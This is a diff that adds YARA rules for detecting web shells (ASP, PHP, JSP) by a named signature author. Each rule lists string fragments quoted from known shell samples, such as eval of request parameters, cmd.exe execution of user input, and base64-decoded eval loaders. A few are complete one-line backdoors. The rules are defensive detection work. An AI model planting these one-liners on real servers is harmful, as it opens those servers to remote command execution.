+		description = "Web Shell - file 1.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "8991148adf5de3b8322ec5d78cb01bdb"
+	strings:
+		$s4 = "!22222222222222222222222222222222222222222222222222" fullword
+		$s8 = "<%eval request(\"pass\")%>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_ASP_tool {
+	meta:
+		description = "Web Shell - file tool.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "4ab68d38527d5834e9c1ff64407b34fb"
+	strings:
+		$s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\""
+		$s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" "
+		$s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas"
+	condition:
+		2 of them
+}
+
+rule webshell_cmd_win32 {
+	meta:
+		description = "Web Shell - file cmd_win32.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "cc4d4d6cc9a25984aa9a7583c7def174"
+	strings:
+		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam"
+		$s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_jsp_jshell {
+	meta:
+		description = "Web Shell - file jshell.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "124b22f38aaaf064cef14711b2602c06"
+	strings:
+		$s0 = "kXpeW[\"" fullword
+		$s4 = "[7b:g0W@W<" fullword
+		$s5 = "b:gHr,g<" fullword
+		$s8 = "RhV0W@W<" fullword
+		$s9 = "S_MR(u7b" fullword
+	condition:
+		all of them
+}
+
+rule webshell_ASP_zehir4 {
+	meta:
+		description = "Web Shell - file zehir4.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "7f4e12e159360743ec016273c3b9108c"
+	strings:
+		$s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/"
+	condition:
+		all of them
+}
+
+rule webshell_wsb_idc {
+	meta:
+		description = "Web Shell - file idc.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "7c5b1b30196c51f1accbffb80296395f"
+	strings:
+		$s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
+		$s3 = "{eval($_GET['idc']);}" fullword
+	condition:
+		1 of them
+}
+
+rule webshell_cpg_143_incl_xpl {
+	meta:
+		description = "Web Shell - file cpg_143_incl_xpl.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "5937b131b67d8e0afdbd589251a5e176"
+	strings:
+		$s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA"
+		$s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time"
+	condition:
+		1 of them
+}
+
+rule webshell_php_404 {
+	meta:
+		description = "Web Shell - file 404.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "ced050df5ca42064056a7ad610a191b3"
+	strings:
+		$s0 = "$pass = md5(md5(md5($pass)));" fullword
+	condition:
+		all of them
+}
+
+rule webshell_webshell_cnseay_x {
+	meta:
+		description = "Web Shell - file webshell-cnseay-x.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "a0f9f7f5cd405a514a7f3be329f380e5"
+	strings:
+		$s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_"
+	condition:
+		all of them
+}
+
+rule webshell_asp_up {
+	meta:
+		description = "Web Shell - file up.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "f775e721cfe85019fe41c34f47c0d67c"
+	strings:
+		$s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio"
+		$s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword
+	condition:
+		1 of them
+}
+
+rule webshell_phpkit_0_1a_odd {
+	meta:
+		description = "Web Shell - file odd.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "3c30399e7480c09276f412271f60ed01"
+	strings:
+		$s1 = "include('php://input');" fullword
+		$s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
+		$s4 = "// uses include('php://input') to execute arbritary code" fullword
+		$s5 = "// php://input based backdoor" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_ASP_cmd {
+	meta:
+		description = "Web Shell - file cmd.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "97af88b478422067f23b001dd06d56a9"
+	strings:
+		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_PHP_Shell_x3 {
+	meta:
+		description = "Web Shell - file PHP Shell.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
+	strings:
+		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
+		$s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
+		$s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset("
+	condition:
+		2 of them
+}
+
+rule webshell_PHP_g00nv13 {
+	meta:
+		description = "Web Shell - file g00nv13.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "35ad2533192fe8a1a76c3276140db820"
+	strings:
+		$s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas"
+		$s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p"
+	condition:
+		all of them
+}
+
+rule webshell_php_h6ss {
+	meta:
+		description = "Web Shell - file h6ss.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "272dde9a4a7265d6c139287560328cd5"
+	strings:
+		$s0 = "<?php eval(gzuncompress(base64_decode(\""
+	condition:
+		all of them
+}
+
+rule webshell_jsp_zx {
+	meta:
+		description = "Web Shell - file zx.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "67627c264db1e54a4720bd6a64721674"
+	strings:
+		$s0 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.g"
+	condition:
+		all of them
+}
+
+rule webshell_Ani_Shell {
+	meta:
+		description = "Web Shell - file Ani-Shell.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "889bfc9fbb8ee7832044fc575324d01a"
+	strings:
+		$s0 = "$Python_CODE = \"I"
+		$s6 = "$passwordPrompt = \"\\n================================================="
+		$s7 = "fputs ($sockfd ,\"\\n==============================================="
+	condition:
+		1 of them
+}
+
+rule webshell_jsp_k8cmd {
+	meta:
+		description = "Web Shell - file k8cmd.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "b39544415e692a567455ff033a97a682"
+	strings:
+		$s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword
+	condition:
+		all of them
+}
+
+rule webshell_jsp_cmd {
+	meta:
+		description = "Web Shell - file cmd.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "5391c4a8af1ede757ba9d28865e75853"
+	strings:
+		$s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword
+	condition:
+		all of them
+}
+
+rule webshell_jsp_k81 {
+	meta:
+		description = "Web Shell - file k81.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "41efc5c71b6885add9c1d516371bd6af"
+	strings:
+		$s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
+		$s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword
+	condition:
+		1 of them
+}
+
+rule webshell_ASP_zehir {
+	meta:
+		description = "Web Shell - file zehir.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "0061d800aee63ccaf41d2d62ec15985d"
+	strings:
+		$s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&"
+	condition:
+		all of them
+}
+
+rule webshell_Worse_Linux_Shell {
+	meta:
+		description = "Web Shell - file Worse Linux Shell.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
+	strings:
+		$s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD"
+	condition:
+		all of them
+}
+
+rule webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit {
+	meta:
+		description = "Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
+	strings:
+		$s1 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_redirect {
+	meta:
+		description = "Web Shell - file redirect.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "97da83c6e3efbba98df270cc70beb8f8"
+	strings:
+		$s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" "
+	condition:
+		all of them
+}
+
+rule webshell_jsp_cmdjsp {
+	meta:
+		description = "Web Shell - file cmdjsp.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "b815611cc39f17f05a73444d699341d4"
+	strings:
+		$s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_jsp_IXRbE {
+	meta:
+		description = "Web Shell - file IXRbE.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "e26e7e0ebc6e7662e1123452a939e2cd"
+	strings:
+		$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
+	condition:
+		all of them
+}
+
+rule webshell_PHP_G5 {
+	meta:
+		description = "Web Shell - file G5.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "95b4a56140a650c74ed2ec36f08d757f"
+	strings:
+		$s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op"
+	condition:
+		all of them
+}
+
+rule webshell_PHP_r57142 {
+	meta:
+		description = "Web Shell - file r57142.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "0911b6e6b8f4bcb05599b2885a7fe8a8"
+	strings:
+		$s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword
+	condition:
+		all of them
+}
+
+rule webshell_jsp_tree {
+	meta:
+		description = "Web Shell - file tree.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "bcdf7bbf7bbfa1ffa4f9a21957dbcdfa"
+	strings:
+		$s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki"
+		$s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ"
+	condition:
+		all of them
+}
+
+rule webshell_C99madShell_v_3_0_smowu {
+	meta:
+		description = "Web Shell - file smowu.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "74e1e7c7a6798f1663efb42882b85bee"
+	strings:
+		$s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for"
+		$s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty"
+	condition:
+		1 of them
+}
+
+rule webshell_PHP_404 {
+	meta:
+		description = "Web Shell - file 404.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "078c55ac475ab9e028f94f879f548bca"
+	strings:
+		$s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)"
+	condition:
+		all of them
+}
+
+rule webshell_Macker_s_Private_PHPShell {
+	meta:
+		description = "Web Shell - file Macker's Private PHPShell.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "e24cbf0e294da9ac2117dc660d890bb9"
+	strings:
+		$s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n"
+		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
+		$s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
+	condition:
+		all of them
+}
+
+rule webshell_Antichat_Shell_v1_3_2 {
+	meta:
+		description = "Web Shell - file Antichat Shell v1.3.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "40d0abceba125868be7f3f990f031521"
+	strings:
+		$s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m"
+	condition:
+		all of them
+}
+
+rule webshell_Safe_mode_breaker {
+	meta:
+		description = "Web Shell - file Safe mode breaker.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "5bd07ccb1111950a5b47327946bfa194"
+	strings:
+		$s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is("
+		$s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)."
+	condition:
+		1 of them
+}
+
+rule webshell_Sst_Sheller {
+	meta:
+		description = "Web Shell - file Sst-Sheller.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "d93c62a0a042252f7531d8632511ca56"
+	strings:
+		$s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>"
+		$s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)"
+	condition:
+		all of them
+}
+
+rule webshell_jsp_list {
+	meta:
+		description = "Web Shell - file list.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "1ea290ff4259dcaeb680cec992738eda"
+	strings:
+		$s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
+		$s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn"
+		$s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword
+	condition:
+		all of them
+}
+
+rule webshell_PHPJackal_v1_5 {
+	meta:
+		description = "Web Shell - file PHPJackal v1.5.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "d76dc20a4017191216a0315b7286056f"
+	strings:
+		$s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form"
+		$s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr"
+	condition:
+		all of them
+}
+
+rule webshell_customize {
+	meta:
+		description = "Web Shell - file customize.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "d55578eccad090f30f5d735b8ec530b1"
+	strings:
+		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
+	condition:
+		all of them
+}
+
+rule webshell_s72_Shell_v1_1_Coding {
+	meta:
+		description = "Web Shell - file s72 Shell v1.1 Coding.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "c2e8346a5515c81797af36e7e4a3828e"
+	strings:
+		$s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya "
+	condition:
+		all of them
+}
+
+rule webshell_jsp_sys3 {
+	meta:
+		description = "Web Shell - file sys3.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "b3028a854d07674f4d8a9cf2fb6137ec"
+	strings:
+		$s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
+		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
+		$s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_jsp_guige02 {
+	meta:
+		description = "Web Shell - file guige02.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "a3b8b2280c56eaab777d633535baf21d"
+	strings:
+		$s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff"
+		$s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private"
+	condition:
+		all of them
+}
+
+rule webshell_php_ghost {
+	meta:
+		description = "Web Shell - file ghost.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "38dc8383da0859dca82cf0c943dbf16d"
+	strings:
+		$s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'"
+		$s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***"
+		$s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword
+	condition:
+		all of them
+}
+
+rule webshell_WinX_Shell {
+	meta:
+		description = "Web Shell - file WinX Shell.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "17ab5086aef89d4951fe9b7c7a561dda"
+	strings:
+		$s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam"
+		$s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </"
+	condition:
+		all of them
+}
+
+rule webshell_Crystal_Crystal {
+	meta:
+		description = "Web Shell - file Crystal.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "fdbf54d5bf3264eb1c4bff1fac548879"
+	strings:
+		$s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value"
+		$s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f"
+	condition:
+		all of them
+}
+
+rule webshell_r57_1_4_0 {
+	meta:
+		description = "Web Shell - file r57.1.4.0.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "574f3303e131242568b0caf3de42f325"
+	strings:
+		$s4 = "@ini_set('error_log',NULL);" fullword
+		$s6 = "$pass='abcdef1234567890abcdef1234567890';" fullword
+		$s7 = "@ini_restore(\"disable_functions\");" fullword
+		$s9 = "@ini_restore(\"safe_mode_exec_dir\");" fullword
+	condition:
+		all of them
+}
+
+rule webshell_asp_ajn {
+	meta:
+		description = "Web Shell - file ajn.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "aaafafc5d286f0bff827a931f6378d04"
+	strings:
+		$s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
+		$s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve"
+	condition:
+		all of them
+}
+
+rule webshell_asp_list {
+	meta:
+		description = "Web Shell - file list.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "1cfa493a165eb4b43e6d4cc0f2eab575"
+	strings:
+		$s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
+		$s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword
+	condition:
+		all of them
+}
+
+rule webshell_PHP_co {
+	meta:
+		description = "Web Shell - file co.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "62199f5ac721a0cb9b28f465a513874c"
+	strings:
+		$s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
+		$s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword
+	condition:
+		all of them
+}
+
+rule webshell_PHP_150 {
+	meta:
+		description = "Web Shell - file 150.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "400c4b0bed5c90f048398e1d268ce4dc"
+	strings:
+		$s0 = "HJ3HjqxclkZfp"
+		$s1 = "<? eval(gzinflate(base64_decode('" fullword
+	condition:
+		all of them
+}
+
+rule webshell_jsp_cmdjsp_2 {
+	meta:
+		description = "Web Shell - file cmdjsp.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "1b5ae3649f03784e2a5073fa4d160c8b"
+	strings:
+		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
+		$s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_PHP_c37 {
+	meta:
+		description = "Web Shell - file c37.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "d01144c04e7a46870a8dd823eb2fe5c8"
+	strings:
+		$s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),"
+		$s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],"
+	condition:
+		all of them
+}
+
+rule webshell_php_backdoor {
+	meta:
+		description = "Web Shell - file php-backdoor.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
+	strings:
+		$s1 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))" fullword
+		$s2 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
+	condition:
+		all of them
+}
+
+rule webshell_asp_dabao {
+	meta:
+		description = "Web Shell - file dabao.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "3919b959e3fa7e86d52c2b0a91588d5d"
+	strings:
+		$s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &"
+		$s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-"
+	condition:
+		all of them
+}
+
+rule webshell_php_2 {
+	meta:
+		description = "Web Shell - file 2.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "267c37c3a285a84f541066fc5b3c1747"
+	strings:
+		$s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword
+	condition:
+		all of them
+}
+
+rule webshell_asp_cmdasp {
+	meta:
+		description = "Web Shell - file cmdasp.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "57b51418a799d2d016be546f399c2e9b"
+	strings:
+		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
+		$s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
+	condition:
+		all of them
+}
+
+rule webshell_spjspshell {
+	meta:
+		description = "Web Shell - file spjspshell.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "d39d51154aaad4ba89947c459a729971"
+	strings:
+		$s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:"
+	condition:
+		all of them
+}
+
+rule webshell_jsp_action {
+	meta:
+		description = "Web Shell - file action.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "5a7d931094f5570aaf5b7b3b06c3d8c0"
+	strings:
+		$s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
+		$s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_Inderxer {
+	meta:
+		description = "Web Shell - file Inderxer.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "9ea82afb8c7070817d4cdf686abe0300"
+	strings:
+		$s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
+	condition:
+		all of them
+}
+
+rule webshell_asp_Rader {
+	meta:
+		description = "Web Shell - file Rader.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "ad1a362e0a24c4475335e3e891a01731"
+	strings:
+		$s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0"
+		$s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 "
+	condition:
+		all of them
+}
+
+rule webshell_c99_madnet_smowu {
+	meta:
+		description = "Web Shell - file smowu.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "3aaa8cad47055ba53190020311b0fb83"
+	strings:
+		$s0 = "//Authentication" fullword
+		$s1 = "$login = \"" fullword
+		$s2 = "eval(gzinflate(base64_decode('"
+		$s4 = "//Pass"
+		$s5 = "$md5_pass = \""
+		$s6 = "//If no pass then hash"
+	condition:
+		all of them
+}
+
+rule webshell_php_moon {
+	meta:
+		description = "Web Shell - file moon.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "2a2b1b783d3a2fa9a50b1496afa6e356"
+	strings:
+		$s2 = "echo '<option value=\"create function backshell returns string soname"
+		$s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\""
+		$s8 = "echo '<option value=\"select cmdshell(\\'net user "
+	condition:
+		2 of them
+}
+
+rule webshell_minupload {
+	meta:
+		description = "Web Shell - file minupload.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "ec905a1395d176c27f388d202375bdf9"
+	strings:
+		$s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
+		$s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859"
+	condition:
+		all of them
+}
+
+rule webshell_ELMALISEKER_Backd00r {
+	meta:
+		description = "Web Shell - file ELMALISEKER Backd00r.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "3aa403e0a42badb2c23d4a54ef43e2f4"
+	strings:
+		$s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio"
+		$s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req"
+	condition:
+		all of them
+}
+
+rule webshell_PHP_bug_1_ {
+	meta:
+		description = "Web Shell - file bug (1).php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "91c5fae02ab16d51fc5af9354ac2f015"
+	strings:
+		$s0 = "@include($_GET['bug']);" fullword
+	condition:
+		all of them
+}
+
+rule webshell_jsp_asd {
+	meta:
+		description = "Web Shell - file asd.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "a042c2ca64176410236fcc97484ec599"
+	strings:
+		$s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
+		$s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url"
+	condition:
+		all of them
+}
+
+rule webshell_metaslsoft {
+	meta:
+		description = "Web Shell - file metaslsoft.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "aa328ed1476f4a10c0bcc2dde4461789"
+	strings:
+		$s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t"
+	condition:
+		all of them
+}
+
+rule webshell_asp_Ajan {
+	meta:
+		description = "Web Shell - file Ajan.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "b6f468252407efc2318639da22b08af0"
+	strings:
+		$s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate"
+	condition:
+		all of them
+}
+
+rule webshell_config_myxx_zend {
+	meta:
+		description = "Web Shell - from files config.jsp, myxx.jsp, zend.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "d44df8b1543b837e57cc8f25a0a68d92"
+		hash1 = "e0354099bee243702eb11df8d0e046df"
+		hash2 = "591ca89a25f06cf01e4345f98a22845c"
+	strings:
+		$s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');"
+	condition:
+		all of them
+}
+
+rule webshell_browser_201_3_ma_download {
+	meta:
+		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
+		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
+		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
+		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
+		hash4 = "fa87bbd7201021c1aefee6fcc5b8e25a"
+	strings:
+		$s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a"
+		$s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith"
+	condition:
+		all of them
+}
+
+rule webshell_itsec_itsecteam_shell_jHn {
+	meta:
+		description = "Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		super_rule = 1
+		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
